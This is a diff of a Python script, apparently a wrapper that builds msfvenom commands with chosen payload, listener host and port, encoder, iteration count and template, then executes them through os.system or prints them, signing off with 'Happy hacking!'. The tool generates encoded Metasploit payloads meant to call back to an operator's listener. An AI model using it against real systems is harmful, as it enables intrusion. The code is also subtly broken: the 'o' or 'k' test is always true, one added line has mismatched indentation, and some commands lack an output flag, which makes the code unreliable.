@@ -201,39 +201,43 @@ try:
     print("Done, generating code...")
 
     outcmd = input("Do you want to execute the command now or just show it? (E/s): ")
-    while True:
-        if outcmd == "E":
-            if file == "x":
-                msfcode = "msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + " -o " + str(output1) + "." + str(output2)
-                print("Executing... " + str(msfcode))
-                os.system(str(msfcode))
-                break
-            elif file == "o" or "k":
-                print("msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
-                os.system("msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
-            else:
-                print("Wrong input, try again!")
-                break
 
-        elif outcmd == "s":
-            try:
-                if file == "x":
-                    print("Your code: msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + " -o " + str(output1) + "." + str(output2))
-                    break
-                elif file == "o":
-                    print("msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
-                    break
-                elif file == "k":
-                    print("msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
-                    break
-                else:
-                    print(col.warn + "invalid input, try again." + col.none)
-
-
-
-            except Exception as e:
-                print(str(e) + "Procceding anyway...")
+    if outcmd == "E":
+        if file == "x":
             print("Happy hacking! (^_^)")
+            msfcode = "msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + " -o " + str(output1) + "." + str(output2)
+            os.system(str(msfcode))
+
+        elif file == "o" or "k":
+            print("Happy hacking! (^_^)")
+            print("msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
+            os.system("msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
+
+        else:
+            print("Wrong input, try again!")
+
+    elif outcmd == "s":
+        try:
+            if file == "x":
+                print("Happy hacking! (^_^)")
+                print("Your code: msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + " -o " + str(output1) + "." + str(output2))
+
+            elif file == "o":
+                print("Happy hacking! (^_^)")
+                print("msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
+
+            elif file == "k":
+                    print("Happy hacking! (^_^)")
+                print("msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
+
+            else:
+                print(col.warn + "invalid input, try again." + col.none)
+
+
+
+        except Exception as e:
+                print(str(e) + "Procceding anyway...")
+
 except KeyboardInterrupt:
     print(" ")
     print(col.warn + "Shutdown... Goodbye" + col.none)
